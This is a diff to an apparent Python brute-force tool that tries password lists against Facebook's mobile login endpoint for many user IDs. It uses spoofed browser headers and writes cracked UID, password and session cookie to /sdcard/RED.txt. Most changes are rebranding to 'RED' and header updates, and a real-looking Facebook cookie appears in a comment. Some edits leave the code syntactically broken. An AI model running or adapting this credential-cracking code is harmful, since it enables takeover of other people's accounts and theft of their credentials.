@@ -503,7 +503,7 @@ def rcrack1(uid,pwx,tl):
 
             session = requests.Session()
 
-            sys.stdout.write('\r[\x1b[\033[1;91mCRACKING 🩸\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\x1b[\033[1;91mR\033[1;32mE\033[1;91m'D\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
 
             sys.stdout.flush()
 
@@ -532,25 +532,26 @@ def rcrack1(uid,pwx,tl):
             header_freefb = {"authority": 'm.alpha.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-           'cache-control': 'max-age=0',           
-           'dpr': '2.625',
-           'referer': 'https://m.alpha.facebook.com/?paipv=0&eav=AfZ8Gp34Q1hL9klLOrSSdcyZKQ9k5nW5LGDgloRLAZ_6_E1XQIZjYtjVxbYJOemRuxM&_rdc=1&_rdr',
-           'sec-ch-prefers-color-scheme': 'dark',
-           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Google Chrome";v="123"',
-           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6261.204", "Google Chrome";v="123.0.6261.204"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-model': '""',
-           'sec-ch-ua-platform': '"Linux"',
-           'sec-ch-ua-platform-version': '""',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': 'pro',
-           'viewport-width': '980',}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+           # 'cookie': 'sb=Xq4iZonTrfV_leYf6nPacQet; datr=Xq4iZu2ozZ19Gkb2TVJOaDkd; ps_n=1; ps_l=1; locale=en_US; dpr=3.752533197402954; wd=685x1257; fr=0xfDlbIj9EYumAA8K.AWVyjey216UmCRLIDd4GsrBnYH0.BmIq5e..AAA.0.0.BmI2e3.AWWl-YEu0BE',
+            'dpr': '2.625',
+            'referer': 'https://web.alpha.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Google Chrome";v="123"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6351.205", "Google Chrome";v="123.0.6351.205"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6351.205 Safari/537.36',
+            'viewport-width': '980',
             lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
@@ -561,11 +562,11 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[🆗🟢] {uid} | {ps}")
+                print(f"\033[38;5;46m[RED🔴] {uid} | {ps}")
 
                 os.system('espeak -a 200 "CONGRATULATIONS"')
                 
-               # print(f" Cookie : {coki} =\033[1;35m'")
+                print(f" Cookie : {coki} =🍪\033[1;35m'")
 
                 open('/sdcard/RED.txt', 'a').write(uid+' | '+ps+'\n')
 
@@ -581,7 +582,7 @@ def rcrack1(uid,pwx,tl):
 
               #  print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+              #  open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(uid)
 
@@ -593,7 +594,7 @@ def rcrack1(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write(f'\r\033[\0[\x1b[\033[1;32mCREKING🩸] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[\0[\x1b[\033[1;32mR\033[1;91mE\033[1;32mD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
 
         sys.stdout.flush()
 
